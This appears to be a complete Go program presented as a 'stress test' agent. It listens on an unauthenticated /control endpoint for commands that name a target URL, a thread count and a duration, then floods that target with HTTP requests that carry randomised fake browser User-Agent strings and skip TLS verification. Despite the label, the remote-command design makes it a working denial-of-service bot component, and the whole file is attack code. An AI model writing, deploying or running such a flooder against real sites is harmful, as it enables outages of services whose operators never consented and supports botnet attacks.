package main

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"sync"
	"time"
	"context"
)

// Command structure for receiving instructions from the control server
type Command struct {
	Action  string `json:"action"`  // "start" or "stop"
	URL     string `json:"url"`     // Target URL
	Threads int    `json:"threads"` // Number of threads
	Timer   int    `json:"timer"`   // Duration in seconds
	Cookie  string `json:"cookie"`  // Cookie for the request (optional)
}

// Global variables for stress test configuration
var (
	ip      string
	port    int
	path    string
	threads int
	timer   int
	cookie  string

	mu         sync.Mutex
	activeTest bool
)

// Pre-defined user agent parts
var (
	choice  = []string{"Macintosh", "Windows", "X11"}
	choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
	choice3 = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
	choice4 = []string{"Linux i686", "Linux x86_64"}
	choice5 = []string{"chrome", "firefox", "edge", "safari"}
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

// Generate a random User-Agent
func getUserAgent() string {
	platform := choice[rand.Intn(len(choice))]
	var os string
	if platform == "Macintosh" {
		os = choice2[rand.Intn(len(choice2))]
	} else if platform == "Windows" {
		os = choice3[rand.Intn(len(choice3))]
	} else if platform == "X11" {
		os = choice4[rand.Intn(len(choice4))]
	}
	browser := choice5[rand.Intn(len(choice5))]
	if browser == "chrome" {
		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
		version := fmt.Sprintf("%d.0.%d.%d", rand.Intn(99), rand.Intn(9999), rand.Intn(999))
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/%s.0 (KHTML, like Gecko) Chrome/%s Safari/%s", os, webkit, version, webkit)
	} else if browser == "firefox" {
		version := fmt.Sprintf("%d.0", rand.Intn(99))
		return fmt.Sprintf("Mozilla/5.0 (%s; rv:%s) Gecko/20100101 Firefox/%s", os, version, version)
	} else if browser == "edge" {
		version := fmt.Sprintf("%d.0.%d.%d", rand.Intn(99), rand.Intn(9999), rand.Intn(999))
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36 Edge/%s", os, version, version)
	} else {
		version := fmt.Sprintf("%d.0", rand.Intn(99))
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Version/%s Safari/537.36", os, version)
	}
}

// Generate an HTTP header for the request
func getHeader() string {
	header := fmt.Sprintf("GET %s HTTP/1.1\r\n", path)
	header += fmt.Sprintf("Host: %s\r\n", ip)
	header += fmt.Sprintf("User-Agent: %s\r\n", getUserAgent())
	header += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
	header += "Accept-Encoding: gzip, deflate\r\n"
	header += "Accept-Language: en-US,en;q=0.5\r\n"
	if cookie != "" {
		header += fmt.Sprintf("Cookie: %s\r\n", cookie)
	}
	header += "Connection: keep-alive\r\n\r\n"
	return header
}

// Worker function for sending requests
func worker(ctx context.Context, id int, wg *sync.WaitGroup, requestCount chan int) {
	defer wg.Done()

	address := fmt.Sprintf("%s:%d", ip, port)

	tlsConfig := &tls.Config{InsecureSkipVerify: true} // Moved here for HTTPS

	for {
		select {
		case <-ctx.Done(): // Stop signal
			fmt.Printf("Worker %d stopping\n", id)
			return
		case count, ok := <-requestCount:
			if !ok {
				return
			}
			var conn net.Conn
			var err error

			// Use TLS for HTTPS connections
			if port == 443 {
				conn, err = tls.Dial("tcp", address, tlsConfig)
			} else {
				conn, err = net.Dial("tcp", address)
			}

			if err != nil {
				fmt.Printf("Worker %d: connection error: %v\n", id, err)
				continue
			}

			header := getHeader()
			for i := 0; i < count; i++ {
				// Randomized delay
				time.Sleep(time.Millisecond * time.Duration(rand.Intn(100)))
				_, err := conn.Write([]byte(header))
				if err != nil {
					fmt.Printf("Worker %d: write error: %v\n", id, err)
					break
				}
			}
			conn.Close()
		}
	}
}

// Start the stress test
func startTest(urlStr string, threads, timer int, cookieStr string) {
	// Parse URL
	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		fmt.Println("Invalid URL:", err)
		return
	}

	ip = parsedURL.Hostname()
	if parsedURL.Port() != "" {
		port, _ = strconv.Atoi(parsedURL.Port())
	} else if parsedURL.Scheme == "https" {
		port = 443
	} else {
		port = 80
	}

	path = parsedURL.Path
	if path == "" {
		path = "/"
	}

	cookie = cookieStr

	fmt.Printf("Starting stress test on %s:%d%s with %d threads for %d seconds\n", ip, port, path, threads, timer)

	var wg sync.WaitGroup
	requestCount := make(chan int, threads)

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timer)*time.Second)
	defer cancel()

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go worker(ctx, i, &wg, requestCount)
	}

	// Dispatch requests
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()

		for t := 0; t < timer; t++ {
			<-ticker.C
			for i := 0; i < threads; i++ {
				// Dynamic load: send a random number of requests per second per thread
				requestCount <- rand.Intn(151) + 50
			}
		}
		close(requestCount)
	}()

	wg.Wait()
	fmt.Println("Stress test completed.")
}

// HTTP handler to receive control commands
func controlHandler(w http.ResponseWriter, r *http.Request) {
	var cmd Command
	if err := json.NewDecoder(r.Body).Decode(&cmd); err != nil {
		http.Error(w, "Invalid command format", http.StatusBadRequest)
		return
	}

	mu.Lock()
	defer mu.Unlock()

	if cmd.Action == "start" && !activeTest {
		activeTest = true
		go func() {
			startTest(cmd.URL, cmd.Threads, cmd.Timer, cmd.Cookie)
			mu.Lock()
			activeTest = false
			mu.Unlock()
		}()
		w.Write([]byte("Stress test started"))
	} else if cmd.Action == "stop" && activeTest {
		activeTest = false
		// No native way to stop a goroutine, but we rely on the test completing
		w.Write([]byte("Stress test stopped"))
	} else {
		w.Write([]byte("Invalid or conflicting command"))
	}
}

func main() {
	http.HandleFunc("/control", controlHandler)
	fmt.Println("Agent server is running on port 8081")
	err := http.ListenAndServe(":8081", nil)
	if err != nil {
		fmt.Printf("Server error: %v\n", err)
	}
}
